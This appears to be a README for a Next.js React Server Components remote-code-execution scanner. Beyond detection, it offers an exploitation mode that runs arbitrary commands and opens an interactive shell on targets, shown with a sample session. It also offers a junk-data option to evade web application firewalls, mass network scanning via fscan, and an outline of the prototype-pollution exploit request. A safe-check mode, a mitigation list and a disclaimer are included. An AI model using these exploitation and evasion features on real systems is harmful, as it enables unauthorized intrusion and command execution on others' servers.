# nextjs-rce-check
nextjs-rce-check Internal Network Check
A command-line tool for detecting CVE-2025-55182 and CVE-2025-66478 in Next.js applications using React Server Components.

For technical details on the vulnerability and detection methodology, see our blog post: https://slcyber.io/research-center/high-fidelity-detection-mechanism-for-rsc-next-js-rce-cve-2025-55182-cve-2025-66478

## Features

- **Vulnerability Detection**: High-precision detection of Next.js RCE vulnerabilities
- **WAF Bypass**: 128KB junk data to bypass WAF content inspection
- **Batch Scanning**: Multi-threaded batch scanning support
- **Network Scanning**: Integrated fscan for network port discovery
- **RCE Exploitation**: Built-in command execution and interactive shell
- **Auto Download**: Automatic fscan download if not present

## How It Works

By default, the scanner sends a crafted multipart POST request containing an RCE proof-of-concept payload that executes a deterministic math operation (`41*271 = 11111`). Vulnerable hosts return the result in the `X-Action-Redirect` response header as `/login?a=11111`.

The scanner tests the root path first. If not vulnerable, it follows same-host redirects (e.g., `/` to `/en/`) and tests the redirect destination. Cross-origin redirects are not followed.

### Safe Check Mode

The `--safe-check` flag uses an alternative detection method that relies on side-channel indicators (500 status code with specific error digest) without executing code on the target. Use this mode when RCE execution is not desired.

### WAF Bypass

The `--waf-bypass` flag prepends random junk data to the multipart request body. This can help evade WAF content inspection that only analyzes the first portion of request bodies. The default size is 128KB, configurable via `--waf-bypass-size`. When WAF bypass is enabled, the timeout is automatically increased to 20 seconds (unless explicitly set).

### Windows Mode

The `--windows` flag switches the payload from Unix shell (`echo $((41*271))`) to PowerShell (`powershell -c "41*271"`) for targets running on Windows.

## Requirements

- Python 3.9+
- requests
- tqdm

## Installation

```bash
git clone https://github.com/yourusername/react2shell-scanner.git
cd react2shell-scanner
pip install -r requirements.txt
```

## Usage

### Basic Scanning (scanner.py)

Scan a single host:

```bash
python3 scanner.py -u https://example.com
```

Scan a list of hosts:

```bash
python3 scanner.py -l hosts.txt
```

Scan with multiple threads and save results:

```bash
python3 scanner.py -l hosts.txt -t 20 -o results.json
```

Scan with custom headers:

```bash
python3 scanner.py -u https://example.com -H "Authorization: Bearer token" -H "Cookie: session=abc"
```

Use safe side-channel detection:

```bash
python3 scanner.py -u https://example.com --safe-check
```

Scan Windows targets:

```bash
python3 scanner.py -u https://example.com --windows
```

Scan with WAF bypass:

```bash
python3 scanner.py -u https://example.com --waf-bypass
```

### Network Scanning (integrated_scan.py)

Integrated scanning with fscan for automatic web service discovery:

```bash
# Quick scan (uses ICMP ping to discover live hosts - faster)
python3 integrated_scan.py -t 192.168.1.0/24

# Full port scan
python3 integrated_scan.py -t 192.168.1.0/24 -p 1-65535

# High thread count
python3 integrated_scan.py -t 192.168.1.0/24 --fscan-threads 1000

# No ping (scan all IPs, slower but more thorough)
python3 integrated_scan.py -t 192.168.1.0/24 --no-ping

# Skip fscan, load URLs from file
python3 integrated_scan.py --skip-fscan urls.txt
```

### RCE Exploitation

Execute commands on vulnerable targets:

```bash
# Execute a single command
python3 integrated_scan.py --rce http://target.com:5000 --cmd "id"

# Enter interactive shell
python3 integrated_scan.py --rce http://target.com:5000 --shell
```

Interactive shell example:
```
[*] RCE Exploitation Mode
[*] Entering interactive shell - Target: http://target.com:5000
[*] Type 'exit' or 'quit' to exit

shell> id
uid=1001(nextjs) gid=65533(nogroup) groups=65533(nogroup)

shell> uname -a
Linux d71742e83261 5.10.110 #1 SMP aarch64 Linux

shell> exit
[*] Exiting interactive shell
```

## Options

### scanner.py

```
-u, --url           Single URL to check
-l, --list          File containing hosts (one per line)
-t, --threads       Number of concurrent threads (default: 10)
--timeout           Request timeout in seconds (default: 10)
-o, --output        Output file for results (JSON)
--all-results       Save all results, not just vulnerable hosts
-k, --insecure      Disable SSL certificate verification
-H, --header        Custom header (can be used multiple times)
-v, --verbose       Show response details for vulnerable hosts
-q, --quiet         Only output vulnerable hosts
--no-color          Disable colored output
--safe-check        Use safe side-channel detection instead of RCE PoC
--windows           Use Windows PowerShell payload instead of Unix shell
--waf-bypass        Add junk data to bypass WAF content inspection
--waf-bypass-size   Size of junk data in KB (default: 128)
```

### integrated_scan.py

```
Scanning Options:
  -t, --target        Target IP or CIDR (e.g., 192.168.1.0/24)
  -p, --ports         Port range (default: 1-65535)
  --fscan-threads     fscan thread count (default: 500)
  --scan-threads      Vulnerability scan thread count (default: 20)
  --timeout           Request timeout in seconds (default: 15)
  --no-ping           Don't use ping for host discovery
  -o, --output        Output file for results (JSON)
  --safe-check        Use safe side-channel detection
  --no-waf-bypass     Disable WAF bypass
  -v, --verbose       Verbose output
  --skip-fscan        Skip fscan, load URLs from file

RCE Options:
  --rce URL           RCE exploitation mode
  --cmd CMD           Command to execute
  --shell             Enter interactive shell
```

## Supported Platforms

fscan auto-download supports:

| Platform | Architecture |
|----------|-------------|
| Linux | AMD64 |
| Linux | ARM64 |
| macOS | AMD64 (Intel) |
| macOS | ARM64 (M1/M2) |
| Windows | AMD64 |

## Payload Structure

The exploit uses a multipart form-data request with prototype pollution:

```
POST / HTTP/1.1
Host: target.com
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

------WebKitFormBoundary...
Content-Disposition: form-data; name="[junk_param]"

[128KB junk data for WAF bypass]
------WebKitFormBoundary...
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model",...}
------WebKitFormBoundary...
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundary...
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundary...--
```

## Detection Response

When vulnerable, the server responds with:

- HTTP Status: `303`
- Header: `x-action-redirect: /login?a=<command_output>`

## Mitigation

1. Upgrade Next.js to the latest secure version
2. Filter requests containing `Next-Action` header in WAF
3. Implement input validation for Server Components
4. Deploy on Vercel/Netlify (built-in protections)

## Credits

The RCE PoC was originally disclosed by [@maple3142](https://x.com/maple3142) -- we are incredibly grateful for their work in publishing a working PoC.

This tooling originally was built out as a safe way to detect the RCE. This functionality is still available via `--safe-check`, the "safe detection" mode.

- Assetnote Security Research Team - [Adam Kues, Tomais Williamson, Dylan Pindur, Patrik Grobshäuser, Shubham Shah](https://x.com/assetnote)
- [xEHLE_](https://x.com/xEHLE_) - RCE output reflection in resp header
- [Nagli](https://x.com/galnagli)

## Disclaimer

This tool is for authorized security research and penetration testing only. Users must ensure:

1. Only use on systems you have permission to test
2. Comply with all applicable laws and regulations
3. Do not use for unauthorized access or malicious activities

The authors are not responsible for any misuse.

## License

MIT License
